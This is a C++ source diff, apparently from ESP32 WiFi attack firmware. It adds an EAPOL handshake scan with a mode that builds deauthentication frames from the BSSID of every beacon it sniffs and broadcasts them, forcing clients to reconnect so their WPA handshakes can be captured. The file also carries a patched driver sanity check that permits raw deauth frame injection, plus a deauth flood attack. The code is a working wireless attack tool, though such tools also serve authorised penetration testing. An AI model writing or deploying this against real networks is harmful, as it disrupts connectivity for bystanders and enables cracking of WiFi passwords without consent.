@@ -14,6 +14,7 @@ LinkedList<AccessPoint>* deauth_flood_ap;
 LinkedList<Station>* device_station;
 
 bool wifiScanRedraw = false;
+bool eapol_scan_send_deauth = false;
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     if (arg == 31337)
@@ -53,6 +54,9 @@ void WiFiModules::main() {
 
 bool WiFiModules::ShutdownWiFi() {
 	if (this->wifi_initialized) {
+
+		if (eapol_scan_send_deauth) eapol_scan_send_deauth = false;
+
 		esp_wifi_set_promiscuous(false);
 		WiFi.disconnect();
 		WiFi.mode(WIFI_OFF);
@@ -144,6 +148,13 @@ void WiFiModules::StartMode(WiFiScanState mode) {
 	}
 	else if (mode == WIFI_SCAN_BEACON) {
 		this->StartBeaconScan();
+	}
+	else if (mode == WIFI_SCAN_EAPOL) {
+		this->StartEapolScan();
+	}
+	else if (mode == WIFI_SCAN_EAPOL_DEAUTH) {
+		eapol_scan_send_deauth = true;
+		this->StartEapolScan();
 	}
 	else if (mode == WIFI_ATTACK_DEAUTH) {
 		this->StartWiFiAttack(mode);
@@ -655,8 +666,6 @@ void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 
 		Serial.println("[INFO] Added Station " + String(sta_addr)  +" -> Ap:" + access_points->get(ap_index).essid);
 		display_buffer->add(String(sta_addr));
-		wifiScanRedraw = true;
-		vTaskDelay(10 / portTICK_PERIOD_MS);
 		display_buffer->add("->" + access_points->get(ap_index).essid);
 		wifiScanRedraw = true;
 
@@ -728,7 +737,6 @@ void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 }
 
 void WiFiModules::beaconSnifferCallback(void* buf , wifi_promiscuous_pkt_type_t type) {
-	extern WiFiModules wifi;
 	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
 	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
 	int len = snifferPacket->rx_ctrl.sig_len;
@@ -784,6 +792,59 @@ void WiFiModules::beaconSnifferCallback(void* buf , wifi_promiscuous_pkt_type_t 
 	}
 }
 
+void WiFiModules::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
+{
+	extern WiFiModules wifi;
+	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
+	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
+	int len = snifferPacket->rx_ctrl.sig_len;
+
+	String display_string = "";
+
+	if (type == WIFI_PKT_MGMT)
+	{
+		len -= 4;
+		int fctl = ntohs(frameControl->fctl);
+		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
+		const WifiMgmtHdr *hdr = &ipkt->hdr;
+	}
+	// Found beacon frame. Decide whether to deauth
+	if (eapol_scan_send_deauth) {
+		if (snifferPacket->payload[0] == 0x80) {    
+		// Build packet
+		
+		wifi.deauth_frame_packet[10] = snifferPacket->payload[10];
+		wifi.deauth_frame_packet[11] = snifferPacket->payload[11];
+		wifi.deauth_frame_packet[12] = snifferPacket->payload[12];
+		wifi.deauth_frame_packet[13] = snifferPacket->payload[13];
+		wifi.deauth_frame_packet[14] = snifferPacket->payload[14];
+		wifi.deauth_frame_packet[15] = snifferPacket->payload[15];
+		
+		wifi.deauth_frame_packet[16] = snifferPacket->payload[10];
+		wifi.deauth_frame_packet[17] = snifferPacket->payload[11];
+		wifi.deauth_frame_packet[18] = snifferPacket->payload[12];
+		wifi.deauth_frame_packet[19] = snifferPacket->payload[13];
+		wifi.deauth_frame_packet[20] = snifferPacket->payload[14];
+		wifi.deauth_frame_packet[21] = snifferPacket->payload[15];      
+		
+		// Send packet
+		esp_wifi_80211_tx(WIFI_IF_AP, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet), false);
+		delay(1);
+		}
+	}
+
+	if (((snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
+
+		char addr[] = "00:00:00:00:00:00";
+		getMAC(addr, snifferPacket->payload, 10);
+		
+		Serial.println("[INFO] Received EAPOL: " + String(addr));
+
+		display_buffer->add(addr);
+		wifiScanRedraw = true;
+	}
+}
+
 void WiFiModules::StartBeaconScan() {
 	Serial.println("[INFO] Starting Beacon scan...");
 
@@ -831,6 +892,48 @@ void WiFiModules::StartDeauthScan() {
 	esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
 	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
 	wifi_initialized = true;
+	vTaskDelay(100 / portTICK_PERIOD_MS);
+}
+
+void WiFiModules::StartEapolScan() {
+
+	Serial.println("[INFO] Starting Eapol scan...");
+
+	esp_wifi_init(&cfg);
+	esp_wifi_set_storage(WIFI_STORAGE_RAM);
+	esp_wifi_set_mode(WIFI_MODE_AP);
+
+	esp_err_t err;
+	wifi_config_t conf;
+	err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
+	if (err != 0)
+	{
+		Serial.print("[ERROR] Failed to set protocol | ErrorCode 0x");
+		Serial.println(err, HEX);
+	}
+
+	esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
+	conf.ap.ssid[0] = '\0';
+	conf.ap.ssid_len = 0;
+	conf.ap.channel = this->set_channel;
+	conf.ap.ssid_hidden = 1;
+	conf.ap.max_connection = 0;
+	conf.ap.beacon_interval = 60000;
+
+	err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
+	if (err != 0)
+	{
+		Serial.print("[ERROR] Failed to set AP config, SSID might visible | ErrorCode: 0x");
+		Serial.println(err, HEX);
+	}
+
+	esp_wifi_start();
+	this->setMac();
+	esp_wifi_set_promiscuous(true);
+	esp_wifi_set_promiscuous_filter(&filt);
+	esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
+	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+	this->wifi_initialized = true;
 	vTaskDelay(100 / portTICK_PERIOD_MS);
 }
 
